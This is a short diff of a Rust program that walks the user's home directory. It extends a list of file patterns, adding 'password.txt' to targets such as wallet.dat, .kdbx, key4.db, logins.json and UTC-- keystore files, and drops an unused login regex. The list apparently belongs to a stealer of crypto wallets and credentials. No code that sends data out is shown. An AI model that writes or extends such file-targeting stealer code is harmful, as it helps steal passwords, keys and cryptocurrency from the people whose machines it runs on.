@@ -11,7 +11,7 @@ use walkdir::WalkDir;
 use whoami;
 
 
-const MASKS: [&str; 11] = ["wallet.dat", ".wallet", ".mmd", ".kdbx", "UTC--20", "pass.txt", "key4.db", "login.bak", "key.bak", ".ldb", "logins.json"];
+const MASKS: [&str; 12] = ["wallet.dat", ".wallet", ".mmd", ".kdbx", "UTC--20", "pass.txt", "key4.db", "login.bak", "key.bak", ".ldb", "logins.json", "password.txt"];
 
 fn main() {
     //dirs::home_dir -> C:/Users/Alice
@@ -29,7 +29,6 @@ fn main() {
 
 
 fn walk_files(path: String) {
-    let RE: Result<Regex, Error> = Regex::new(r"^(?P<login>[^@\s]+)@");
     for entry in WalkDir::new(path)
         .follow_links(true)
         .into_iter()
